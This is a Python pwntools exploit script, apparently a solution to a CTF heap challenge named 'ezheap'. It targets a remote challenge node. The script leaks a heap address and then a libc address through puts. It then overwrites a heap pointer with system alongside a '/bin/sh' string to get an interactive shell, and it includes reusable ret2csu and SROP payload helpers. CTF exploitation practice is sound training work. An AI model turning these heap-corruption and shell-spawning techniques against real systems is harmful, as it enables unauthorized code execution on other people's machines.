from pwn import *
from LibcSearcher import *

context(arch="amd64", os="linux", log_level="debug")
context.terminal = ["tmux", "split", "-h"]
# context(arch="amd64",os="linux",log_level="debug")
binary = "./ezheap/ezheap"
libc = "./ezheap/libc-2.23.so"

rop = ROP(binary)
elf = ELF(binary)

libc_elf = ELF(libc)
# libc_dll = cdll.LoadLibrary(libc)


local = 1

ip, port = "61.147.171.105", 20848
# ip, port = "chall.pwnable.tw" 1
if local == 0:
    p = process(binary)
    dbg = lambda p: gdb.attach(p)
else:
    # p = remote(ip, port)
    # p = remote("pwn.challenge.ctf.show",port)
    # p = remote("node5.buuoj.cn", port)
    p = remote("node5.anna.nssctf.cn", port)

    dbg = lambda _: None


ls = lambda addr: log.success(hex(addr))


def search(func_name: str, func_addr: int):
    log.success(func_name + ": " + hex(func_addr))
    libc = LibcSearcher(func_name, func_addr)
    offset = func_addr - libc.dump(func_name)
    binsh = offset + libc.dump("str_bin_sh")
    system = offset + libc.dump("system")
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


def search_from_libc(func_name: str, func_addr: int, libc=libc_elf):
    log.success(func_name + ": " + hex(func_addr))
    offset = func_addr - libc.symbols[func_name]
    binsh = offset + libc.search(b"/bin/sh").__next__()
    system = offset + libc.symbols["system"]
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


# __libc_start_main

csu_start = 0x0


def csu(edi=0, rsi=0, rdx=0, r12=0, start=csu_start):
    end = start + 0x1A
    payload = p64(end)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    payload += p64(r12)  # r12
    payload += p64(edi)  # edi
    payload += p64(rsi)  # rsi
    payload += p64(rdx)  # rdx
    payload += p64(start)
    payload += b"a" * 56
    return payload


def sig(rax=0, rdi=0, rsi=0, rdx=0, rsp=0, rip=0):
    sigframe = SigreturnFrame()
    sigframe.rax = rax
    sigframe.rdi = rdi  # "/bin/sh" 's addr
    sigframe.rsi = rsi
    sigframe.rdx = rdx
    sigframe.rsp = rsp
    sigframe.rip = rip
    return bytes(sigframe)


# =================start=================#


def add(idx, size, name, content):
    p.sendlineafter(b"Choice:", str(1).encode())
    p.sendafter(b"idx", str(idx).encode())
    p.sendafter(b"Size", str(size).encode())
    p.sendafter(b"Name", name)
    p.sendafter(b"Content", content)


def delete(idx):
    p.sendlineafter(b"Choice:", str(2).encode())
    p.sendafter(b"idx", str(idx).encode())


def show(idx):
    p.sendlineafter(b"Choice:", str(3).encode())
    p.sendafter(b"idx", str(idx).encode())


def edit(idx, size, content):
    p.sendlineafter(b"Choice:", str(4).encode())
    p.sendafter(b"idx", str(idx).encode())
    p.sendafter(b"Size", str(size).encode())
    p.send(content)


add(0, 0x40, b"aaaa", b"bbbb")
add(1, 0x60, b"aaaa", b"bbbb")

delete(0)
delete(1)

add(0, 0x20, b"a" * 0xF + b"|", b"bbbb")
add(1, 0x40, b"aaaa", b"bbbb")
show(0)

p.recvuntil(b"|")
heap_addr = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\0")) - 0x10
ls(heap_addr)

edit(1, 0x100, b"a" * 0x48 + p64(0x31) + b"a" * 0xF + b"|" + p64(heap_addr + 0xB0))
show(0)
p.recvuntil(b"|")
p.recvline()
puts_addr = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\0"))
sys, _ = search_from_libc("puts", puts_addr)

edit(
    1,
    0x100,
    b"a" * 0x48
    + p64(0x31)
    + b"/bin/sh\x00"
    + b"a" * 0x8
    + p64(heap_addr + 0xB0)
    + p64(0)
    + p64(sys),
)

# dbg(p)

p.interactive()
